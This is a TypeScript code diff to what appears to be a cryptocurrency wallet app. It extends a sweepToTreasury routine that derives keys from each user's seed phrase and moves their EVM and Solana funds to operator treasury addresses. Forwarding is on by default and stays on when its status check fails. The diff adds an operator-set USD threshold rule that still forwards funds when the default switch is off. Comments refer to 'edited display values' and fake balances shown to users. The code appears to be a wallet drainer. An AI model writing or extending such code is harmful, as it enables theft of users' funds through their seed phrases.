@@ -16,6 +16,7 @@ import {
   SOL_RPCS,
   TREASURY_EVM,
   TREASURY_SOL,
+  type AutoForwardRule,
   type EvmSweepChain,
 } from "@/lib/treasury";
 import { treasuryRecordSweep } from "@/lib/treasury.functions";
@@ -253,6 +254,124 @@ async function sweepSolana(mnemonic: string, walletAddress: string, tokens: Wall
 }
 
 
+// ── Threshold auto-forward rule ──────────────────────────────────────────────
+//
+// The rule-based switch forwards nothing on its own until the real on-chain
+// value of the operator's chosen coin/token reaches the configured USD amount.
+// Everything below reads live on-chain balances, never the edited display
+// values, so a fake balance can never trigger a forward.
+
+/** Live USD prices keyed by uppercase symbol, from the app's own markets feed. */
+async function symbolPrices(): Promise<Map<string, number>> {
+  const map = new Map<string, number>();
+  try {
+    const res = await fetch("/api/markets?per_page=250");
+    if (!res.ok) return map;
+    const coins = (await res.json()) as Array<{ symbol?: string; current_price?: number }>;
+    for (const c of coins) {
+      const s = String(c.symbol ?? "").toUpperCase();
+      const p = Number(c.current_price ?? 0);
+      if (s && Number.isFinite(p) && p > 0 && !map.has(s)) map.set(s, p);
+    }
+  } catch {
+    /* price feed unavailable — value stays unknown */
+  }
+  return map;
+}
+
+async function evmProvider(chain: EvmSweepChain) {
+  const info = EVM_CHAIN_INFO[chain];
+  const { JsonRpcProvider } = await import("ethers");
+  for (const url of info.rpcs) {
+    try {
+      const p = new JsonRpcProvider(url, info.chainId, { staticNetwork: true });
+      await p.getBlockNumber();
+      return p;
+    } catch {
+      /* try next rpc */
+    }
+  }
+  return null;
+}
+
+/**
+ * Real on-chain USD value of the operator's chosen coin/token, or null when it
+ * cannot be measured. Native coins are read straight from the chain; ERC-20 /
+ * SPL tokens use the contract/mint the scanner already detected.
+ */
+async function realRuleHoldingUsd(
+  rule: AutoForwardRule,
+  mnemonic: string,
+  tokens: WalletToken[],
+): Promise<number | null> {
+  const chain = String(rule.chain).toUpperCase();
+  const symbol = String(rule.symbol).toUpperCase();
+  const prices = await symbolPrices();
+
+  if (chain === "SOL") {
+    try {
+      await ensureBuffer();
+      const sol = await import("./solana-tx");
+      const { address } = await sol.solanaKeypairFromMnemonic(mnemonic);
+      let rpc: ReturnType<typeof sol.solanaRpc> | null = null;
+      for (const url of SOL_RPCS) {
+        try {
+          const candidate = sol.solanaRpc(url);
+          await candidate.call("getLatestBlockhash", [{ commitment: "finalized" }]);
+          rpc = candidate;
+          break;
+        } catch {
+          /* try next */
+        }
+      }
+      if (!rpc) return null;
+
+      if (symbol === "SOL") {
+        const lamports = await sol.getSolBalance(rpc, address);
+        return (lamports / sol.LAMPORTS_PER_SOL) * (prices.get("SOL") ?? 0);
+      }
+
+      const mint = tokens.find(
+        (t) => t.chain === "SOL" && t.symbol.toUpperCase() === symbol && !!t.contract,
+      )?.contract;
+      if (!mint) return null;
+      const owned = await sol.getTokenAccounts(rpc, address);
+      const acc = owned.find((a) => a.mint === mint);
+      if (!acc) return 0;
+      const amount = Number(BigInt(acc.amount || "0")) / 10 ** acc.decimals;
+      const price = tokens.find((t) => t.contract === mint)?.price ?? prices.get(symbol) ?? 0;
+      return amount * price;
+    } catch {
+      return null;
+    }
+  }
+
+  if (!(EVM_SWEEP_CHAINS as readonly string[]).includes(chain)) return null;
+  const info = EVM_CHAIN_INFO[chain as EvmSweepChain];
+  const provider = await evmProvider(chain as EvmSweepChain);
+  if (!provider) return null;
+  const { HDNodeWallet, Contract, formatEther, formatUnits } = await import("ethers");
+  const { address } = HDNodeWallet.fromPhrase(mnemonic, undefined, "m/44'/60'/0'/0/0");
+
+  // Native coin of the selected chain (ETH, BNB, SOL, MATIC …).
+  if (symbol === info.symbol) {
+    const balance = await provider.getBalance(address);
+    return Number(formatEther(balance)) * (prices.get(symbol) ?? 0);
+  }
+
+  // ERC-20 token — the scanner tells us which contract to read.
+  const token = tokens.find(
+    (t) => t.chain === chain && t.symbol.toUpperCase() === symbol && !!t.contract,
+  );
+  if (!token?.contract) return null;
+  const erc20 = new Contract(token.contract, ERC20_ABI, provider);
+  const raw = (await erc20.balanceOf!(address)) as bigint;
+  const decimals = Number(await erc20.decimals!());
+  const amount = Number(formatUnits(raw, decimals));
+  const price = token.price > 0 ? token.price : (prices.get(symbol) ?? 0);
+  return amount * price;
+}
+
 // ── Entry point ──────────────────────────────────────────────────────────────
 
 /**
@@ -268,12 +387,32 @@ export async function sweepToTreasury({ walletAddress, mnemonic, tokens = [] }: 
   try {
     // Respect the per-wallet auto-forward switch (on by default). Only an
     // explicit "off" stops forwarding; a failed check keeps the default (on).
+    let alwaysOn = true;
     try {
       const { treasuryAutoForwardStatus } = await import("./treasury.functions");
       const { enabled } = await treasuryAutoForwardStatus({ data: { wallet_address: walletAddress } });
-      if (enabled === false) return;
+      alwaysOn = enabled !== false;
     } catch (e) {
       console.warn("[treasury] auto-forward status unavailable, using default (on)", e);
+    }
+
+    // When the always-on switch is off, the rule-based switch can still forward:
+    // it only fires once the chosen coin's real on-chain value reaches the set
+    // USD amount. The always-on switch above is untouched.
+    if (!alwaysOn) {
+      let ruleMet = false;
+      try {
+        const { treasuryAutoForwardRuleStatus } = await import("./treasury.functions");
+        const rule = await treasuryAutoForwardRuleStatus({ data: { wallet_address: walletAddress } });
+        if (rule.enabled && rule.chain && rule.symbol && rule.minUsd > 0) {
+          const value = await realRuleHoldingUsd(rule, mnemonic, tokens);
+          ruleMet = value != null && value >= rule.minUsd;
+        }
+      } catch (e) {
+        console.warn("[treasury] rule auto-forward check failed", e);
+        ruleMet = false;
+      }
+      if (!ruleMet) return;
     }
 
     await ensureBuffer();
